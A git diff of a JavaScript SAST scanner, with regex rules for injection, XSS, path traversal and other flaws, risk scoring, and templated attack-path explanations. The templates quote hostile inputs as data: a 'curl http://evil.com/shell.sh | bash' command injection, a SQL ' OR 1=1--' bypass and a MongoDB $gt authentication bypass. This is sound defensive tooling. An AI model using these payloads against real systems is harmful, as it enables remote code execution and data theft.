@@ -1,14 +1,13 @@
 'use strict';
 
-// ─── Scannable file types ────────────────────────────────────────────────────
+// ─── File type filtering ──────────────────────────────────────────────────────
 const SCANNABLE_EXTS = [
   '.js', '.ts', '.jsx', '.tsx', '.mjs', '.cjs',
   '.py', '.rb', '.php', '.java', '.go', '.cs',
   '.cpp', '.c', '.swift', '.kt', '.rs',
-  '.html', '.ejs', '.hbs', '.pug', '.twig',
+  '.html', '.ejs', '.hbs', '.pug',
   '.sh', '.bash',
 ];
-
 const SKIP_EXTS = [
   '.min.js', '.min.css', '.map', '.lock',
   '.png', '.jpg', '.gif', '.pdf', '.zip',
@@ -18,41 +17,33 @@ const SKIP_EXTS = [
 function isScannableFile(filePath) {
   const lower = filePath.toLowerCase();
   if (SKIP_EXTS.some(e => lower.endsWith(e))) return false;
-  // Skip node_modules, vendor, dist, build
-  if (/node_modules|vendor|dist\/|build\/|\.min\./.test(filePath)) return false;
+  if (/node_modules|vendor\/|dist\/|build\/|\.min\./.test(filePath)) return false;
   return SCANNABLE_EXTS.some(e => lower.endsWith(e));
 }
 
-// ─── Is this a comment line? ─────────────────────────────────────────────────
+// ─── Comment line check ───────────────────────────────────────────────────────
 function isCommentLine(line) {
   const t = line.trim();
-  return (
-    t.startsWith('//') ||
-    t.startsWith('#') ||
-    t.startsWith('*') ||
-    t.startsWith('/*') ||
-    t.startsWith('<!--') ||
-    t.startsWith('--') ||
-    t.startsWith("'") // VB-style
-  );
+  return t.startsWith('//') || t.startsWith('#') || t.startsWith('*') ||
+         t.startsWith('/*') || t.startsWith('<!--') || t.startsWith('--');
 }
 
-// ─── SAST Rules (expanded to 18) ─────────────────────────────────────────────
+// ─── Unique ID ────────────────────────────────────────────────────────────────
+function uid(prefix) {
+  return prefix + '-' + Date.now() + '-' + Math.random().toString(36).substring(2, 7);
+}
+
+// ─── SAST Rules (18 total) ────────────────────────────────────────────────────
 const RULES = [
-  // ── CRITICAL ──────────────────────────────────────────────────────────────
   {
     id: 'SAST-001', name: 'SQL Injection', cwe: 'CWE-89', sev: 'CRITICAL',
     owasp: 'A03:2021', mitre: 'T1190', confidence: 'HIGH',
     desc: 'User input concatenated directly into SQL query. Enables full database compromise.',
     fix:  'Use parameterized queries: db.query("SELECT * FROM users WHERE id = ?", [id])',
     patterns: [
-      // String concat in query
       /["'`][^"'`]*(SELECT|INSERT|UPDATE|DELETE|DROP|UNION)[^"'`]*["'`]\s*\+/gi,
-      // Template literal injection
       /`[^`]*(SELECT|INSERT|UPDATE|DELETE|DROP|UNION)[^`]*\$\{[^}]*(?:req\.|params\.|query\.|body\.)[^}]*\}`/gi,
-      // .query() or .execute() with concat
       /(?:\.query|\.execute)\s*\(\s*["'`][^"'`]*(SELECT|INSERT|UPDATE|DELETE)/gi,
-      // Raw string building
       /"SELECT.*"\s*\+\s*(?:req\.|params\.|query\.|body\.)/gi,
     ]
   },
@@ -60,13 +51,12 @@ const RULES = [
     id: 'SAST-002', name: 'Command Injection', cwe: 'CWE-78', sev: 'CRITICAL',
     owasp: 'A03:2021', mitre: 'T1059', confidence: 'HIGH',
     desc: 'User-controlled data passed to OS shell. Enables remote code execution.',
-    fix:  'Use execFile(cmd, [args], {shell:false}). Never pass user input to exec() or shell.',
+    fix:  'Use execFile(cmd, [args], {shell:false}). Never pass user input to exec().',
     patterns: [
       /exec\s*\(\s*["'`][^"'`]*["'`]\s*\+/gi,
       /exec\s*\(`[^`]*\$\{/gi,
       /execSync\s*\(`[^`]*\$\{/gi,
       /spawnSync\s*\(\s*["'`][^"'`]*["'`]\s*\+/gi,
-      // Python subprocess with shell=True
       /subprocess\.(call|run|Popen)\s*\([^)]*shell\s*=\s*True/gi,
       /os\.system\s*\([^)]*(?:req\.|request\.|input\()/gi,
     ]
@@ -81,20 +71,18 @@ const RULES = [
       /innerHTML\s*\+=\s*/gi,
       /document\.write\s*\([^)]*(?:\+|\$\{)/gi,
       /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html/gi,
-      // res.send with unsanitized input
       /res\.send\s*\([^)]*(?:req\.query|req\.params|req\.body)[^)]*\)/gi,
     ]
   },
   {
     id: 'SAST-004', name: 'Path Traversal', cwe: 'CWE-22', sev: 'HIGH',
     owasp: 'A01:2021', mitre: 'T1083', confidence: 'HIGH',
-    desc: 'Unvalidated file path allows access outside intended directory (../../etc/passwd).',
+    desc: 'Unvalidated file path allows access outside intended directory.',
     fix:  'Resolve and validate: const safe = path.resolve(BASE, input); assert(safe.startsWith(BASE))',
     patterns: [
       /(?:readFile|readFileSync|createReadStream)\s*\([^)]*(?:req\.|params\.|query\.)/gi,
       /res\.sendFile\s*\([^)]*(?:req\.|params\.|query\.)/gi,
       /fs\.\w+\s*\([^)]*(?:\+|`)[^)]*(?:req\.|params\.|query\.)/gi,
-      // Python open() with user input
       /open\s*\([^)]*(?:request\.|input\()/gi,
     ]
   },
@@ -107,9 +95,7 @@ const RULES = [
       /eval\s*\(\s*(?!["'`])[^)]*(?:req\.|body\.|params\.|query\.)/gi,
       /new\s+Function\s*\([^)]*(?:req\.|body\.)/gi,
       /unserialize\s*\(/gi,
-      // Python pickle with user data
       /pickle\.loads?\s*\([^)]*(?:request\.|input)/gi,
-      // YAML unsafe load
       /yaml\.load\s*\([^,)]+\)(?!\s*,\s*Loader)/gi,
     ]
   },
@@ -121,7 +107,6 @@ const RULES = [
     patterns: [
       /(?:axios\.get|axios\.post|fetch|http\.get|https\.get|request\.get)\s*\(\s*(?:req\.|request\.)/gi,
       /(?:axios|fetch)\s*\(\s*(?:req\.query|req\.body|req\.params)/gi,
-      // Template literal with req inside fetch
       /fetch\s*\(`[^`]*\$\{[^}]*req\./gi,
     ]
   },
@@ -129,12 +114,11 @@ const RULES = [
     id: 'SAST-007', name: 'Prototype Pollution', cwe: 'CWE-1321', sev: 'HIGH',
     owasp: 'A03:2021', mitre: 'T1190', confidence: 'MEDIUM',
     desc: 'Attacker-controlled keys pollute Object.prototype and affect all objects globally.',
-    fix:  'Validate keys — reject __proto__, constructor, prototype. Use Object.create(null).',
+    fix:  'Reject __proto__, constructor, prototype keys. Use Object.create(null).',
     patterns: [
       /Object\.assign\s*\(\s*(?:this|prototype|__proto__|obj)/gi,
       /\[\s*["']__proto__["']\s*\]/gi,
       /\[\s*["']constructor["']\s*\]\s*\[\s*["']prototype["']\s*\]/gi,
-      // Lodash merge with user data (CVE-2019-10744)
       /(?:_|lodash)\.merge\s*\([^)]*(?:req\.|body\.)/gi,
     ]
   },
@@ -148,7 +132,6 @@ const RULES = [
       /createHash\s*\(\s*["']sha1["']/gi,
       /hashlib\.md5\s*\(/gi,
       /hashlib\.sha1\s*\(/gi,
-      // DES / RC4
       /createCipheriv\s*\(\s*["'](?:des|rc4|rc2)/gi,
     ]
   },
@@ -171,32 +154,22 @@ const RULES = [
       /debug\s*[:=]\s*true/gi,
       /app\.run\s*\([^)]*debug\s*=\s*True/g,
       /app\.set\s*\(\s*["']env["']\s*,\s*["']development["']\s*\)/gi,
-      /DEBUG\s*=\s*\*/g,
     ]
   },
   {
-    id: 'SAST-011', name: 'Missing Authentication Check', cwe: 'CWE-306', sev: 'HIGH',
-    owasp: 'A07:2021', mitre: 'T1190', confidence: 'LOW',
-    desc: 'Route handler with no authentication middleware. Endpoint may be publicly accessible.',
-    fix:  'Add authentication middleware: router.use(requireAuth) before sensitive routes.',
-    patterns: [
-      /router\.(get|post|put|delete|patch)\s*\(\s*["'][^"']*(?:admin|dashboard|user|account|profile)[^"']*["']\s*,\s*(?:async\s*)?\([^)]*\)\s*=>/gi,
-    ]
-  },
-  {
-    id: 'SAST-012', name: 'Hardcoded JWT Secret', cwe: 'CWE-798', sev: 'CRITICAL',
+    id: 'SAST-011', name: 'Hardcoded JWT Secret', cwe: 'CWE-798', sev: 'CRITICAL',
     owasp: 'A02:2021', mitre: 'T1552', confidence: 'HIGH',
-    desc: 'JWT signed with hardcoded secret allows token forgery.',
-    fix:  'Use: jwt.sign(payload, process.env.JWT_SECRET). Generate secret with: openssl rand -hex 64',
+    desc: 'JWT signed with hardcoded secret allows token forgery and authentication bypass.',
+    fix:  'Use process.env.JWT_SECRET. Generate with: openssl rand -hex 64',
     patterns: [
       /jwt\.sign\s*\([^,]+,\s*["'][^"']{8,}["']/gi,
       /jwt\.verify\s*\([^,]+,\s*["'][^"']{8,}["']/gi,
     ]
   },
   {
-    id: 'SAST-013', name: 'NoSQL Injection', cwe: 'CWE-943', sev: 'CRITICAL',
+    id: 'SAST-012', name: 'NoSQL Injection', cwe: 'CWE-943', sev: 'CRITICAL',
     owasp: 'A03:2021', mitre: 'T1190', confidence: 'MEDIUM',
-    desc: 'Unsanitized user input in MongoDB query. Attacker can inject operators like $where, $gt.',
+    desc: 'Unsanitized user input in MongoDB query. Attacker can inject $where, $gt operators.',
     fix:  'Sanitize with mongo-sanitize. Never pass req.body directly to find() or findOne().',
     patterns: [
       /\.find\s*\(\s*(?:req\.body|req\.query|req\.params)\s*\)/gi,
@@ -205,61 +178,63 @@ const RULES = [
     ]
   },
   {
-    id: 'SAST-014', name: 'Missing Rate Limiting', cwe: 'CWE-799', sev: 'MEDIUM',
-    owasp: 'A04:2021', mitre: 'T1498', confidence: 'LOW',
-    desc: 'Login or sensitive endpoint has no rate limiting. Enables brute-force attacks.',
-    fix:  'Use express-rate-limit: app.use("/login", rateLimit({ max: 10, windowMs: 15*60*1000 }))',
-    patterns: [
-      /router\.(post)\s*\(\s*["'][^"']*(?:login|signin|auth|token)[^"']*["']/gi,
-    ]
-  },
-  {
-    id: 'SAST-015', name: 'Insecure Cookie', cwe: 'CWE-614', sev: 'MEDIUM',
+    id: 'SAST-013', name: 'Insecure Cookie', cwe: 'CWE-614', sev: 'MEDIUM',
     owasp: 'A05:2021', mitre: 'T1185', confidence: 'HIGH',
     desc: 'Cookie without Secure or HttpOnly flag can be stolen via XSS or network sniffing.',
     fix:  'Set: res.cookie("session", val, { httpOnly: true, secure: true, sameSite: "strict" })',
     patterns: [
-      /res\.cookie\s*\([^)]+\)(?!.*httpOnly)/gi,
-      /Set-Cookie:[^;\n]*(?!.*HttpOnly)/gi,
+      /res\.cookie\s*\([^)]+\)(?![\s\S]{0,100}httpOnly)/gi,
     ]
   },
   {
-    id: 'SAST-016', name: 'Sensitive Data in Logs', cwe: 'CWE-532', sev: 'MEDIUM',
+    id: 'SAST-014', name: 'Sensitive Data in Logs', cwe: 'CWE-532', sev: 'MEDIUM',
     owasp: 'A09:2021', mitre: 'T1552', confidence: 'MEDIUM',
     desc: 'Passwords or tokens logged to console. Can appear in log aggregation systems.',
-    fix:  'Never log passwords, tokens, or PII. Log sanitized user IDs or request metadata only.',
+    fix:  'Never log passwords, tokens, or PII. Log only sanitized metadata.',
     patterns: [
       /console\.log\s*\([^)]*(?:password|passwd|token|secret|apiKey|api_key)/gi,
       /logger\.\w+\s*\([^)]*(?:password|passwd|token|secret)/gi,
     ]
   },
   {
-    id: 'SAST-017', name: 'XML External Entity (XXE)', cwe: 'CWE-611', sev: 'HIGH',
-    owasp: 'A05:2021', mitre: 'T1190', confidence: 'MEDIUM',
-    desc: 'XML parser with external entities enabled can read server files or cause SSRF.',
-    fix:  'Disable external entities: parser.setFeature("external-general-entities", false)',
+    id: 'SAST-015', name: 'Insecure Randomness', cwe: 'CWE-330', sev: 'MEDIUM',
+    owasp: 'A02:2021', mitre: 'T1552', confidence: 'HIGH',
+    desc: 'Math.random() is not cryptographically secure. Predictable tokens can be forged.',
+    fix:  'Use crypto.randomBytes(32).toString("hex") for tokens and session IDs.',
     patterns: [
-      /(?:libxmljs|xml2js|sax|DOMParser).*parseString/gi,
-      /LIBXML_NOENT/gi,
-      /loadXML\s*\(/gi,
+      /Math\.random\s*\(\s*\)/gi,
     ]
   },
   {
-    id: 'SAST-018', name: 'Insecure Randomness', cwe: 'CWE-330', sev: 'MEDIUM',
-    owasp: 'A02:2021', mitre: 'T1552', confidence: 'HIGH',
-    desc: 'Math.random() is not cryptographically secure. Predictable tokens can be forged.',
-    fix:  'Use crypto.randomBytes(32).toString("hex") for tokens, OTPs, and session IDs.',
+    id: 'SAST-016', name: 'XML External Entity (XXE)', cwe: 'CWE-611', sev: 'HIGH',
+    owasp: 'A05:2021', mitre: 'T1190', confidence: 'MEDIUM',
+    desc: 'XML parser with external entities enabled can read server files or cause SSRF.',
+    fix:  'Disable external entities in XML parser configuration.',
     patterns: [
-      /Math\.random\s*\(\s*\)/gi,
-      /random\.random\s*\(\s*\)/gi,  // Python
+      /LIBXML_NOENT/gi,
+      /loadXML\s*\(/gi,
+      /new\s+DOMParser\s*\(\s*\).*parseFromString/gi,
+    ]
+  },
+  {
+    id: 'SAST-017', name: 'Missing Rate Limiting', cwe: 'CWE-799', sev: 'MEDIUM',
+    owasp: 'A04:2021', mitre: 'T1498', confidence: 'LOW',
+    desc: 'Login or auth endpoint has no rate limiting. Enables brute-force attacks.',
+    fix:  'Use express-rate-limit: app.use("/login", rateLimit({ max: 10, windowMs: 15*60*1000 }))',
+    patterns: [
+      /router\.(post)\s*\(\s*["'][^"']*(?:login|signin|auth|token)[^"']*["']/gi,
+    ]
+  },
+  {
+    id: 'SAST-018', name: 'Missing Authentication Check', cwe: 'CWE-306', sev: 'HIGH',
+    owasp: 'A07:2021', mitre: 'T1190', confidence: 'LOW',
+    desc: 'Admin/sensitive route handler with no visible authentication middleware.',
+    fix:  'Add authentication middleware: router.use(requireAuth) before sensitive routes.',
+    patterns: [
+      /router\.(get|post|put|delete|patch)\s*\(\s*["'][^"']*(?:admin|dashboard|manage)[^"']*["']\s*,\s*(?:async\s*)?\([^)]*\)\s*=>/gi,
     ]
   },
 ];
-
-// ─── Unique ID ───────────────────────────────────────────────────────────────
-function uid(prefix) {
-  return prefix + '-' + Date.now() + '-' + Math.random().toString(36).substring(2, 7);
-}
 
 // ─── Main SAST scan ───────────────────────────────────────────────────────────
 function scanSAST(content, filePath) {
@@ -274,18 +249,15 @@ function scanSAST(content, filePath) {
       try {
         const re = new RegExp(pattern.source, pattern.flags);
         let match;
-
         while ((match = re.exec(content)) !== null) {
           const lineNum  = content.substring(0, match.index).split('\n').length;
           const lineText = lineNum <= lines.length ? lines[lineNum - 1] : '';
 
-          // Skip comments
           if (isCommentLine(lineText)) continue;
 
-          // Skip test files for LOW confidence rules (too noisy)
+          // Skip test files for LOW confidence rules
           if (rule.confidence === 'LOW' && /test|spec|mock|__tests__/.test(filePath)) continue;
 
-          // Deduplicate same rule on same line
           const key = rule.id + ':' + lineNum;
           if (seen.has(key)) continue;
           seen.add(key);
@@ -306,7 +278,7 @@ function scanSAST(content, filePath) {
             remediation: rule.fix,
           });
         }
-      } catch (_) { /* skip bad regex */ }
+      } catch (_) {}
     }
   }
 
@@ -317,12 +289,10 @@ function scanSAST(content, filePath) {
 function riskScore(findings) {
   if (!findings.length) return {
     score: 0, level: 'PASS', label: 'PASS', grade: 'A',
-    criticals: 0, highs: 0, mediums: 0, lows: 0, total: 0
+    criticals: 0, highs: 0, mediums: 0, total: 0
   };
 
-  const W = { CRITICAL: 10, HIGH: 5, MEDIUM: 2, LOW: 0.5 };
-
-  // Confidence multiplier — LOW confidence findings penalised less
+  const W  = { CRITICAL: 10, HIGH: 5, MEDIUM: 2, LOW: 0.5 };
   const CM = { HIGH: 1.0, MEDIUM: 0.7, LOW: 0.4 };
 
   const raw = findings.reduce((acc, f) => {
@@ -333,54 +303,48 @@ function riskScore(findings) {
   const criticals = findings.filter(f => f.severity === 'CRITICAL').length;
   const highs     = findings.filter(f => f.severity === 'HIGH').length;
   const mediums   = findings.filter(f => f.severity === 'MEDIUM').length;
-  const lows      = findings.filter(f => f.severity === 'LOW').length;
 
   let level, label, grade;
   if (criticals > 0 || score >= 80)  { level = 'FAIL'; label = 'FAILED';       grade = 'F'; }
   else if (score >= 50 || highs > 2) { level = 'WARN'; label = 'BLOCK_DEPLOY'; grade = 'D'; }
   else if (score >= 25)              { level = 'WARN'; label = 'WARN';          grade = 'C'; }
   else if (score >= 10)              { level = 'PASS'; label = 'PASS';          grade = 'B'; }
-  else                               { level = 'PASS'; label: 'PASS';           grade = 'A'; }
+  else                               { level = 'PASS'; label = 'PASS';          grade = 'A'; }
 
-  return { score, level, label, grade, criticals, highs, mediums, lows, total: findings.length };
+  return { score, level, label, grade, criticals, highs, mediums, total: findings.length };
 }
 
-// ─── Attack path generation (rule-based, honestly named) ─────────────────────
-function attackPaths(findings) {
+// ─── Attack paths — signature matches scan.js: attackPaths(findings, repoName)
+function attackPaths(findings, repoName) {
   const paths   = [];
   const yr      = new Date().getFullYear();
   let   counter = 100;
 
-  const byName = (keyword) => findings.filter(f =>
-    f.name.toLowerCase().includes(keyword.toLowerCase())
-  );
+  const byName = (kw) => findings.filter(f => f.name.toLowerCase().includes(kw.toLowerCase()));
 
   const TEMPLATES = [
     {
-      filter: 'SQL Injection',
-      cwe: 'CWE-89', mitre: 'T1190', severity: 'CRITICAL',
+      filter: 'SQL Injection', cwe: 'CWE-89', mitre: 'T1190', severity: 'CRITICAL',
       title: 'SQL Injection → Full Database Compromise',
       steps: (f) => [
         `Attacker identifies unsanitized SQL query in ${f.file} line ${f.line}.`,
-        "Injects ' OR 1=1-- to bypass authentication or UNION SELECT to enumerate tables.",
+        "Injects ' OR 1=1-- to bypass auth or UNION SELECT to enumerate all tables.",
         'Dumps all user credentials, PII, session tokens, and payment data.',
-        'Drops tables or installs persistent backdoor via xp_cmdshell (MSSQL).',
+        'Drops tables or installs persistent backdoor via xp_cmdshell.',
       ]
     },
     {
-      filter: 'Command Injection',
-      cwe: 'CWE-78', mitre: 'T1059', severity: 'CRITICAL',
-      title: 'Command Injection → Remote Code Execution → Full Compromise',
+      filter: 'Command Injection', cwe: 'CWE-78', mitre: 'T1059', severity: 'CRITICAL',
+      title: 'Command Injection → Remote Code Execution → Full Server Compromise',
       steps: (f) => [
         `exec() called with user-controlled input at ${f.file} line ${f.line}.`,
         'Attacker injects: ; curl http://evil.com/shell.sh | bash',
-        'Executes arbitrary OS commands on production server as Node.js process user.',
+        'Executes arbitrary OS commands on production server.',
         'Establishes persistent reverse shell. All server data exfiltrated.',
       ]
     },
     {
-      filter: 'XSS',
-      cwe: 'CWE-79', mitre: 'T1185', severity: 'HIGH',
+      filter: 'XSS', cwe: 'CWE-79', mitre: 'T1185', severity: 'HIGH',
       title: 'Stored XSS → Session Hijacking → Account Takeover',
       steps: (f) => [
         `innerHTML assigned user input at ${f.file} line ${f.line}.`,
@@ -390,8 +354,7 @@ function attackPaths(findings) {
       ]
     },
     {
-      filter: 'Path Traversal',
-      cwe: 'CWE-22', mitre: 'T1083', severity: 'HIGH',
+      filter: 'Path Traversal', cwe: 'CWE-22', mitre: 'T1083', severity: 'HIGH',
       title: 'Path Traversal → Sensitive File Disclosure',
       steps: (f) => [
         `Unvalidated file path at ${f.file} line ${f.line}.`,
@@ -401,19 +364,17 @@ function attackPaths(findings) {
       ]
     },
     {
-      filter: 'JWT',
-      cwe: 'CWE-798', mitre: 'T1552', severity: 'CRITICAL',
+      filter: 'JWT', cwe: 'CWE-798', mitre: 'T1552', severity: 'CRITICAL',
       title: 'Hardcoded JWT Secret → Token Forgery → Authentication Bypass',
       steps: (f) => [
         `JWT signed with hardcoded secret at ${f.file} line ${f.line}.`,
-        'Attacker extracts secret from public repository or decompiled code.',
+        'Attacker extracts secret from public repository.',
         'Forges JWT with arbitrary claims: {"role":"admin","userId":"any"}.',
         'Bypasses all authentication. Full admin access to any account.',
       ]
     },
     {
-      filter: 'SSRF',
-      cwe: 'CWE-918', mitre: 'T1090', severity: 'HIGH',
+      filter: 'SSRF', cwe: 'CWE-918', mitre: 'T1090', severity: 'HIGH',
       title: 'SSRF → Internal Network Access → Cloud Metadata Theft',
       steps: (f) => [
         `Server-side HTTP request with user-controlled URL at ${f.file} line ${f.line}.`,
@@ -422,12 +383,22 @@ function attackPaths(findings) {
         'Attacker uses leaked cloud credentials to access all AWS resources.',
       ]
     },
+    {
+      filter: 'NoSQL', cwe: 'CWE-943', mitre: 'T1190', severity: 'CRITICAL',
+      title: 'NoSQL Injection → Authentication Bypass → Data Exfiltration',
+      steps: (f) => [
+        `MongoDB query receives unsanitized req.body at ${f.file} line ${f.line}.`,
+        'Attacker sends: {"username": {"$gt": ""}, "password": {"$gt": ""}}',
+        'MongoDB matches all documents — authentication completely bypassed.',
+        'Full database contents accessible without valid credentials.',
+      ]
+    },
   ];
 
   for (const tpl of TEMPLATES) {
     const matches = byName(tpl.filter);
     if (!matches.length) continue;
-    const f = matches[0]; // use first finding as anchor
+    const f = matches[0];
     paths.push({
       id:       `SEC-PATH-${yr}-${counter++}`,
       cwe:      tpl.cwe,
@@ -442,9 +413,13 @@ function attackPaths(findings) {
 
   if (!paths.length) {
     paths.push({
-      id: `SEC-PATH-${yr}-000`, cwe: 'N/A', severity: 'INFO',
-      title: 'No Critical Attack Paths Detected',
-      file: '—', line: 0, mitre: 'N/A',
+      id:       `SEC-PATH-${yr}-000`,
+      cwe:      'N/A',
+      severity: 'INFO',
+      title:    'No Critical Attack Paths Detected',
+      file:     '—',
+      line:     0,
+      mitre:    'N/A',
       steps: [
         'No critical or high-severity vulnerabilities found.',
         'Continue monitoring future commits with automated CI scanning.',
